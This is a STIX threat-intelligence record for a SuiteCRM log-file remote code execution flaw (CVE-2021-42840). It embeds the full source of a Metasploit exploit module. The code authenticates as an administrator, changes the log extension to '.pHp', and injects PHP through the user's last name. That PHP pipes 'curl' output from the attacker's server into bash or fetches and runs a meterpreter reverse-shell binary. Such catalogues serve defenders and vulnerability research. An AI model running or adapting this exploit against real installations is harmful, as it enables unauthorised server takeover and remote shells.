{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4fe157b9-30f3-4a99-9fdf-d86b6e512648",
    "created": "2024-08-14T17:03:03.031467Z",
    "modified": "2024-08-14T17:03:03.031471Z",
    "name": "SuiteCRM Log File Remote Code Execution",
    "description": " This module exploits an input validation error on the log file extension parameter. It does not properly validate upper/lower case characters. Once this occurs, the application log file will be treated as a php file. The log file can then be populated with php code by changing the username of a valid user, as this info is logged. The php code in the file can then be executed by sending an HTTP request to the log file. A similar issue was reported by the same researcher where a blank file extension could be supplied and the extension could be provided in the file name. This exploit will work on those versions as well, and those references are included.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/suitecrm_log_file_rce.rb",
            "external_id": "suitecrm_log_file_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-42840"
        },
        {
            "source_name": "reference",
            "url": "https://theyhack.me/SuiteCRM-RCE-2/#Thisexploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SuiteCRM Log File Remote Code Execution',\n        'Description' => %q{\n          This module exploits an input validation error on the log file extension parameter. It does\n          not properly validate upper/lower case characters. Once this occurs, the application log file\n          will be treated as a php file. The log file can then be populated with php code by changing the\n          username of a valid user, as this info is logged. The php code in the file can then be executed\n          by sending an HTTP request to the log file. A similar issue was reported by the same researcher\n          where a blank file extension could be supplied and the extension could be provided in the file\n          name. This exploit will work on those versions as well, and those references are included.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'M. Cory Billington' # @_th3y\n        ],\n        'References' => [\n          ['CVE', '2021-42840'],\n          ['CVE', '2020-28328'], # First CVE\n          ['EDB', '49001'], # Previous exploit, this module will cover those versions too. Almost identical issue.\n          ['URL', 'https://theyhack.me/CVE-2020-28320-SuiteCRM-RCE/'], # First exploit\n          ['URL', 'https://theyhack.me/SuiteCRM-RCE-2/'] # This exploit\n        ],\n        'Platform' => %w[linux unix],\n        'Arch' => %w[ARCH_X64 ARCH_CMD ARCH_X86],\n        'Targets' => [\n          [\n            'Linux (x64)', {\n              'Arch' => ARCH_X64,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux (cmd)', {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ]\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'Privileged' => true,\n        'DisclosureDate' => '2021-04-28',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to SuiteCRM', '/']),\n        OptString.new('USER', [true, 'Username of user with administrative rights', 'admin']),\n        OptString.new('PASS', [true, 'Password for administrator', 'admin']),\n        OptBool.new('RESTORECONF', [false, 'Restore the configuration file to default after exploit runs', true]),\n        OptString.new('WRITABLEDIR', [false, 'Writable directory to stage meterpreter', '/tmp']),\n        OptString.new('LASTNAME', [false, 'Admin user last name to clean up profile', 'admin'])\n      ]\n    )\n  end\n\n  def check\n    authenticate unless @authenticated\n    return Exploit::CheckCode::Unknown unless @authenticated\n\n    version_check_request = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'module' => 'Home',\n          'action' => 'About'\n        }\n      }\n    )\n\n    return Exploit::CheckCode::Unknown(\"#{peer} - Connection timed out\") unless version_check_request\n\n    version_match = version_check_request.body[/\n      Version\n      \\s\n      \\d{1} # Major revision\n      \\.\n      \\d{1,2} # Minor revision\n      \\.\n      \\d{1,2} # Bug fix release\n      /x]\n\n    version = version_match.partition(' ').last\n\n    if version.nil? || version.empty?\n      about_url = \"#{full_uri}#{normalize_uri(target_uri, 'index.php')}?module=Home&action=About\"\n      return Exploit::CheckCode::Unknown(\"Check #{about_url} to confirm version.\")\n    end\n\n    patched_version = Rex::Version.new('7.11.18')\n    current_version = Rex::Version.new(version)\n\n    return Exploit::CheckCode::Appears(\"SuiteCRM #{version}\") if current_version <= patched_version\n\n    Exploit::CheckCode::Safe(\"SuiteCRM #{version}\")\n  end\n\n  def authenticate\n    print_status(\"Authenticating as #{datastore['USER']}\")\n    initial_req = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri, 'index.php'),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'module' => 'Users',\n          'action' => 'Login'\n        }\n      }\n    )\n\n    return false unless initial_req && initial_req.code == 200\n\n    login = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri, 'index.php'),\n        'keep_cookies' => true,\n        'vars_post' => {\n          'module' => 'Users',\n          'action' => 'Authenticate',\n          'return_module' => 'Users',\n          'return_action' => 'Login',\n          'user_name' => datastore['USER'],\n          'username_password' => datastore['PASS'],\n          'Login' => 'Log In'\n        }\n      }\n    )\n\n    return false unless login && login.code == 302\n\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri, 'index.php'),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'module' => 'Administration',\n          'action' => 'index'\n        }\n      }\n    )\n\n    auth_succeeded?(res)\n  end\n\n  def auth_succeeded?(res)\n    return false unless res\n\n    if res.code == 200\n      print_good(\"Authenticated as: #{datastore['USER']}\")\n      if res.body.include?('Unauthorized access to administration.')\n        print_warning(\"#{datastore['USER']} does not have administrative rights! Exploit will fail.\")\n        @is_admin = false\n      else\n        print_good(\"#{datastore['USER']} has administrative rights.\")\n        @is_admin = true\n      end\n      @authenticated = true\n      return true\n    else\n      print_error(\"Failed to authenticate as: #{datastore['USER']}\")\n      return false\n    end\n  end\n\n  def post_log_file(data)\n    send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri, 'index.php'),\n        'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n        'keep_cookies' => true,\n        'headers' => {\n          'Referer' => \"#{full_uri}#{normalize_uri(target_uri, 'index.php')}?module=Configurator&action=EditView\"\n        },\n        'data' => data.to_s\n      }\n    )\n  end\n\n  def modify_system_settings_file\n    filename = rand_text_alphanumeric(8).to_s\n    extension = '.pHp'\n    @php_fname = filename + extension\n    action = 'Modify system settings file'\n    print_status(\"Trying - #{action}\")\n\n    data = Rex::MIME::Message.new\n    data.add_part('SaveConfig', nil, nil, 'form-data; name=\"action\"')\n    data.add_part('Configurator', nil, nil, 'form-data; name=\"module\"')\n    data.add_part(filename.to_s, nil, nil, 'form-data; name=\"logger_file_name\"')\n    data.add_part(extension.to_s, nil, nil, 'form-data; name=\"logger_file_ext\"')\n    data.add_part('info', nil, nil, 'form-data; name=\"logger_level\"')\n    data.add_part('Save', nil, nil, 'form-data; name=\"save\"')\n\n    res = post_log_file(data)\n    check_logfile_request(res, action)\n  end\n\n  def poison_log_file\n    action = 'Poison log file'\n    if target.arch.first == 'cmd'\n      command_injection = \"<?php `curl #{@download_url} | bash`; ?>\"\n    else\n      @meterpreter_fname = \"#{datastore['WRITABLEDIR']}/#{rand_text_alphanumeric(8)}\"\n      command_injection = %(\n        <?php `curl #{@download_url} -o #{@meterpreter_fname};\n        /bin/chmod 700 #{@meterpreter_fname};\n        /bin/sh -c #{@meterpreter_fname};`; ?>\n      )\n    end\n\n    print_status(\"Trying - #{action}\")\n\n    data = Rex::MIME::Message.new\n    data.add_part('Users', nil, nil, 'form-data; name=\"module\"')\n    data.add_part('1', nil, nil, 'form-data; name=\"record\"')\n    data.add_part('Save', nil, nil, 'form-data; name=\"action\"')\n    data.add_part('EditView', nil, nil, 'form-data; name=\"page\"')\n    data.add_part('DetailView', nil, nil, 'form-data; name=\"return_action\"')\n    data.add_part(datastore['USER'], nil, nil, 'form-data; name=\"user_name\"')\n    data.add_part(command_injection, nil, nil, 'form-data; name=\"last_name\"')\n\n    res = post_log_file(data)\n    check_logfile_request(res, action)\n  end\n\n  def restore\n    action = 'Restore logging to default configuration'\n    print_status(\"Trying - #{action}\")\n\n    data = Rex::MIME::Message.new\n    data.add_part('SaveConfig', nil, nil, 'form-data; name=\"action\"')\n    data.add_part('Configurator', nil, nil, 'form-data; name=\"module\"')\n    data.add_part('suitecrm', nil, nil, 'form-data; name=\"logger_file_name\"')\n    data.add_part('.log', nil, nil, 'form-data; name=\"logger_file_ext\"')\n    data.add_part('fatal', nil, nil, 'form-data; name=\"logger_level\"')\n    data.add_part('Save', nil, nil, 'form-data; name=\"save\"')\n\n    post_log_file(data)\n\n    data = Rex::MIME::Message.new\n    data.add_part('Users', nil, nil, 'form-data; name=\"module\"')\n    data.add_part('1', nil, nil, 'form-data; name=\"record\"')\n    data.add_part('Save', nil, nil, 'form-data; name=\"action\"')\n    data.add_part('EditView', nil, nil, 'form-data; name=\"page\"')\n    data.add_part('DetailView', nil, nil, 'form-data; name=\"return_action\"')\n    data.add_part(datastore['USER'], nil, nil, 'form-data; name=\"user_name\"')\n    data.add_part(datastore['LASTNAME'], nil, nil, 'form-data; name=\"last_name\"')\n\n    res = post_log_file(data)\n\n    print_error(\"Failed - #{action}\") unless res && res.code == 301\n\n    print_good(\"Succeeded - #{action}\")\n  end\n\n  def check_logfile_request(res, action)\n    fail_with(Failure::Unknown, \"#{action} - no reply\") unless res\n\n    unless res.code == 301\n      print_error(\"Failed - #{action}\")\n      fail_with(Failure::UnexpectedReply, \"Failed - #{action}\")\n    end\n\n    print_good(\"Succeeded - #{action}\")\n  end\n\n  def execute_php\n    print_status(\"Executing php code in log file: #{@php_fname}\")\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri, @php_fname),\n        'keep_cookies' => true\n      }\n    )\n    fail_with(Failure::NotFound, \"#{peer} - Not found: #{@php_fname}\") if res && res.code == 404\n    register_files_for_cleanup(@php_fname)\n    register_files_for_cleanup(@meterpreter_fname) unless @meterpreter_fname.nil? || @meterpreter_fname.empty?\n  end\n\n  def on_request_uri(cli, _request)\n    send_response(cli, payload.encoded, { 'Content-Type' => 'text/plain' })\n    print_good(\"#{peer} - Payload sent!\")\n  end\n\n  def start_http_server\n    start_service(\n      {\n        'Uri' => {\n          'Proc' => proc do |cli, req|\n            on_request_uri(cli, req)\n          end,\n          'Path' => resource_uri\n        }\n      }\n    )\n    @download_url = get_uri\n  end\n\n  def exploit\n    start_http_server\n    authenticate unless @authenticated\n    fail_with(Failure::NoAccess, datastore['USER'].to_s) unless @authenticated\n    fail_with(Failure::NoAccess, \"#{datastore['USER']} does not have administrative rights!\") unless @is_admin\n    modify_system_settings_file\n    poison_log_file\n    execute_php\n  ensure\n    restore if datastore['RESTORECONF']\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-04-28",
    "x_mitre_platforms": [
        "unix'"
    ]
}